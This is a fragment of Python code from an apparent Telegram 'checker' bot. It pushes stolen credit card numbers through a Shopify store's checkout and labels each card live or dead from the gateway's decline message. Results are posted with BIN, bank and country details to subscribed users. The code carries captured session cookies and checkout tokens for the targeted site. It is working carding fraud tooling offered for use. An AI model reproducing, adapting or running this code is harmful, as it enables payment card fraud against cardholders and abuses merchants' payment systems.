checkout_token_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVZpT0RBMk1UZ3hNREkwTURnMllqVm1NR0poTjJJeVlXVmhaREJrWkRZeE5BWTZCa1ZVIiwiZXhwIjoiMjAyNC0wOC0yMVQxNjo0MToyOC4zNzdaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuX2xlZ2FjeSJ9fQ%3D%3D--184f6d0f1215b13064497f45246d794d19bd4524; secure_customer_sig=; localization=US; _y=269066fe-435a-45a2-8505-e7776c74c15d; _shopify_y=269066fe-435a-45a2-8505-e7776c74c15d; _orig_referrer=; _landing_page=%2F; _gcl_au=1.1.138443381.1691601220; Visitor UUID=6B0813B7-8416-4B47-8F8B-88C605D6CC4F; _tt_enable_cookie=1; _ttp=S-8DK7zYorpUgtpg1u1GyYQd53s; _fbp=fb.1.1691601230147.1227457672; _pin_unauth=dWlkPU9EUXlaREl4TWpZdFpEWTVOUzAwTldVeExUZ3hNV0l0WVRoak5qRXlPV0k1WWprMw; IR_gbd=copperfitusa.com; _hjSessionUser_2579048=eyJpZCI6IjAzYWQyOWI2LTU5MmMtNTE0OC05M2Q2LTY5Mzc3YjI0OWJhMyIsImNyZWF0ZWQiOjE2OTE2MDEyMzA4MTYsImV4aXN0aW5nIjp0cnVlfQ==; _s=43b42c1b-58b1-4d1a-890d-3b9df416c8aa; _shopify_s=43b42c1b-58b1-4d1a-890d-3b9df416c8aa; _dtm=02d18fc5-3b40-ee11-8b98-a0369f1303c7; _dtm_ct=1; _shopify_sa_p=; _gid=GA1.2.1411259558.1692633602; _lab=1125900340919287; _hjSession_2579048=eyJpZCI6IjdhY2FmODQwLWY2NGEtNGI0MS1iYzk3LWZkNmY4ZTFiOGRmMyIsImNyZWF0ZWQiOjE2OTI2MzM2MDQ5NDEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; IR_PI=1f651cfe-36d8-11ee-8d87-b553c9fefc6c%7C1692720008711; cart=495ce728f5a20d69c157acf367d2176a; _clck=10w7bj5|2|fec|0|1316; recentlyViewed=sport-ankle-energy-socks%252Cenergy-compression-socks%252Cgift-card; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2OTE2MDEyMzUsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmNvcHBlcmZpdHVzYS5jb20vIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNjkyNjMzOTA0LCJ2YWx1ZSI6IiIsImZpcnN0X3BhZ2UiOiJodHRwczovL3d3dy5jb3BwZXJmaXR1c2EuY29tLyJ9fQ==; IR_18259=1692633904375%7C0%7C1692633904375%7C%7C; irclickid=~c~cjpxwAsnilmjhmklryofgejf~-fmqhc~f89Z0VRKEuslea43ZP; cart_ts=1692634770; cart_sig=23b491da0a9494cd3b9288e4bc9bc690; cart_ver=gcp-us-central1%3A5; _cmp_a=%7B%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22merchant_geo%22%3A%22USUSCT%22%2C%22sale_of_data_region%22%3Afalse%7D; _secure_session_id=1d2611e9167a25d2cb802e635c019b92; _checkout_queue_token=AqWvLmux2qvr6E-8VOBwq4xTNUR0pJ36c3icGmyQzXTOHtN18439l4kSQYEMZ2nXfMF1Rjf-1xr2V4gU5ynrXbOPm6bfsrJ2_2SS25ULYoOGLXqI1tri4NVwNG7iW6DBf6XGuHBI5AiQzvZZtyVqFOgx2une9MJwlCt6uCM012m7akeMUrmQvvDKUF7sxg%3D%3D; _checkout_queue_checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVZpT0RBMk1UZ3hNREkwTURnMllqVm1NR0poTjJJeVlXVmhaREJrWkRZeE5BWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOC0yMVQxNzo0MToyMy40MDZaIiwicHVyIjoiY29va2llLl9jaGVja291dF9xdWV1ZV9jaGVja291dF90b2tlbiJ9fQ%3D%3D--7ec4eb3f78bc51ee9063789aa0d6523502bf6a93; _uetsid=c97499a0403b11ee969a3156fb92afe9; _uetvid=1a51aa5036d811ee82e88586c2f14767; _shopify_sa_t=2023-08-21T16%3A41%3A27.258Z; _ga_F660MDJKVE=GS1.2.1692633604.3.1.1692636087.60.0.0; _ga=GA1.2.142797443.1691601228; usi_launched=t1692636722192; _clsk=788ftr|1692637826544|3|1|z.clarity.ms/collect; _ga_K390HB4LFG=GS1.1.1692633603.3.1.1692637862.0.0.0; unique_interaction_id=58b55ef4-5f4c-44cf-6b91-0d0070ea7c72',
    'origin': 'https://www.copperfitusa.com',
    'referer': 'https://www.copperfitusa.com/',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
}
    data_3 = f'_method=patch&authenticity_token={token_3}&previous_step=payment_method&step=&s={idpwnw}&checkout%5Bpayment_gateway%5D=73086369946&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=2284&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=430&checkout%5Bclient_details%5D%5Bbrowser_height%5D=759&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240'

    req9 = session.post(url=url,headers=headers_4,data=data_3)

    time.sleep(5)

    req10 = session.get(url=str(url) + '?from_processing_page=1&validate=true')

    texto_4 = req10.text
    status_ = await response_sh(req9)
    mensaje = find_between(texto_4,'<div class="notice__content"><p class="notice__text">','</p></div></div>')
    
    if mensaje =="Declined: 15005-This transaction cannot be processed.":
            res = "Dead ❌"
    elif mensaje =="Declined: 10414-Inform the customer that PayPal declined the transaction and to contact PayPal Customer Service.":
        res = "Dead ❌"
    elif mensaje =="Insufficient Funds":
        res = "Approved ✅"
    elif mensaje == "Issuer Generated Error":
        res = "Declined ❌"
    elif mensaje == "Decline CVV2/CID Fail":
        res = "Approved ✅"
    else:
        res = "Declined ❌"

    await contra.edit_text(f"""<b>🩵Ｈｘｃｋ🩵Ｃｈｋ🩵Ｂｏｔ🩵

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Status: <code>{res}</code></b> 
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Reponse: <code>{mensaje}</code>
✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bin: <code>{cc[0:6]}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bank : <code>{x.get("bank_name")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Country: <code>{x.get("country")} {x.get("flag")}</code>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Gateways: <code> Sh + vtv </code>

⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>""", disable_web_page_preview=True)







